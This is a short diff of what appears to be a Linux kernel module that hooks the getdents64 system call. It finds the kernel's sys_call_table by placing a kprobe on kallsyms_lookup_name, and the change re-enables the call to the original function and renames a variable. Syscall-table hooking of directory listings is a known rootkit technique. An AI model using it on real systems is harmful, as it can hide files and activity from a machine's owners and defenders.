@@ -223,7 +223,7 @@ int alpine_ksys_getdents64(unsigned int fd,struct linux_dirent64 __user* dirent,
     //fdput_pos(f);
     ksys_getdents64_func original_getdents64;
     original_getdents64 = (ksys_getdents64_func)original_syscall_table[__NR_getdents64];
-    //error = original_getdents64(fd, dirent, count);
+    error = original_getdents64(fd, dirent, count);
     return error;
 }
 
@@ -262,11 +262,11 @@ long unsigned int* lookup_syscall_table_by_kprobe(void){
         .symbol_name = "kallsyms_lookup_name"
     };
     typedef long unsigned int (*kallsyms_lookup_name_func)(const char* name);
-    kallsyms_lookup_name_func kallsyms_lookup_name;
+    kallsyms_lookup_name_func allsyms_lookup_by_name;
     register_kprobe(&kp);
-    kallsyms_lookup_name = (kallsyms_lookup_name_func)kp.addr;
+    allsyms_lookup_by_name = (kallsyms_lookup_name_func)kp.addr;
     unregister_kprobe(&kp);
-    return kallsyms_lookup_name("sys_call_table");
+    return allsyms_lookup_by_name("sys_call_table");
 }
 
 /** Find it in /proc/kallsyms
